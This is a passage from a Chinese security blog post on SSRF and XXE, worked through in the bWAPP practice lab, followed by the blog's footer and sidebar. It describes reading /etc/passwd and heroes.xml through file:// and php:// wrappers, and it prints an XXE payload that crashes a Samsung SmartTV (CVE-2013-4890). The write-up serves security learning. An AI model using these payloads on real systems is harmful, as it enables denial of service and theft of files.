+<p><a href="http://image.3001.net/images/20171218/15135807719273.png" target="_blank" rel="noopener"><img src="http://upload-images.jianshu.io/upload_images/9113981-4028a5e670b3c276.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="任务2  2.png"></a> </p>
+<p>使用php协议获取/bWAPP/passwords/heroes.xml中的经过base64编码的数据。</p>
+<p><a href="http://image.3001.net/images/20171218/15135808166705.png" target="_blank" rel="noopener"><img src="http://upload-images.jianshu.io/upload_images/9113981-3acdb6eaca9e095e.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="64.png"></a> </p>
+<p><a href="http://image.3001.net/images/20171218/15135808455912.png" target="_blank" rel="noopener"><img src="http://upload-images.jianshu.io/upload_images/9113981-c62b734547b8246d.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="65.png"></a> </p>
+<p>使用file协议获取bWAPP本机的/etc/passwd的内容。</p>
+<p><a href="http://image.3001.net/images/20171218/15135808842327.png" target="_blank" rel="noopener"><img src="http://upload-images.jianshu.io/upload_images/9113981-466c4a799e902c31.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="password.png"></a></p>
+<p><strong>任务3：使用XXE进行SmartTV的拒绝服务漏洞的利用（没有演示环境，先留坑)</strong><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Crashes my Samsung SmartTV (CVE-2013-4890) ;)</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY bWAPP SYSTEM "http://[IP]:5600/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>&amp;bWAPP;<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>blah<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>参考：<a href="http://www.freebuf.com/column/157466.html" target="_blank" rel="noopener">http://www.freebuf.com/column/157466.html</a></p>
+
+      
+    </div>
+    
+    
+    
+		
+		<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2018/11/22/ssrf/">ssrf</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 berlin 的个人博客">berlin</a></p>
+  <p><span>发布时间:</span>2018年11月22日 - 20:11</p>
+  <p><span>最后更新:</span>2018年11月22日 - 20:11</p>
+  <p><span>原始链接:</span><a href="/2018/11/22/ssrf/" title="ssrf">http://yoursite.com/2018/11/22/ssrf/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2018/11/22/ssrf/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+      
+    </div> 
+		
+    
+		
+		<div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+    </div>
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ssrf/" rel="tag"><i class="fa fa-tag"></i> ssrf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/22/RedisBug/" rel="next" title="Redis未授权访问漏洞">
+                <i class="fa fa-chevron-left"></i> Redis未授权访问漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/22/flask/" rel="prev" title="PythonFlask框架学习">
+                PythonFlask框架学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=RA-5ba8b3dc680529ed" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNzU3MS8xNDEwMw=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/zhenzhen.jpg"
+                alt="berlin" />
+            
+              <p class="site-author-name" itemprop="name">berlin</p>
+              <p class="site-description motion-element" itemprop="description">每天都是美好的一天</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://zhoubolin.github.io" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1057032770@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.jianshu.com/u/c531954533ea" target="_blank" title="简书">
+                      
+                        <i class="fa fa-fw fa-globe"></i>简书</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/qq_33699981/article/details/72716951" target="_blank" title="csdn">
+                      
+                        <i class="fa fa-fw fa-globe"></i>csdn</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jianshu.com/u/c531954533ea" title="简书" target="_blank">简书</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.liuxianglai.top/" title="Smiles" target="_blank">Smiles</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zbojia.com/" title="R1ka" target="_blank">R1ka</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sunraycanter.top/" title="UnKnown" target="_blank">UnKnown</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shaobaobaoer.cn/" title="shaobaobao" target="_blank">shaobaobao</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://kuraraneko.github.io/" title="n3k0" target="_blank">n3k0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.virtua1.cn/" title="virtua1" target="_blank">virtua1</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+					<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=574566207&auto=1&height=66"></iframe>
+					
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF漏洞是如何产生的？"><span class="nav-number">1.</span> <span class="nav-text">SSRF漏洞是如何产生的？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ssrf用途"><span class="nav-number">1.0.1.</span> <span class="nav-text">ssrf用途</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF漏洞的寻找（漏洞常见出没位置）："><span class="nav-number">1.0.2.</span> <span class="nav-text">SSRF漏洞的寻找（漏洞常见出没位置）：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF漏洞的验证方法："><span class="nav-number">1.0.3.</span> <span class="nav-text">SSRF漏洞的验证方法：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF实例"><span class="nav-number">2.</span> <span class="nav-text">SSRF实例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-bWAPP中的SSRF"><span class="nav-number">2.0.1.</span> <span class="nav-text">1. bWAPP中的SSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-SSRF的3个小实验"><span class="nav-number">2.0.2.</span> <span class="nav-text">2. SSRF的3个小实验</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#http-10-22-10-191-Myphp-s-hell-php-file-https-bbs-ichunqiu-com"><span class="nav-number"></span> <span class="nav-text">http://10.22.10.191/Myphp/s_hell.php?file=https://bbs.ichunqiu.com</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">berlin</span>
+
+  
+</div>
+
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!--
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+	
+	
+  undefined
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+</html>
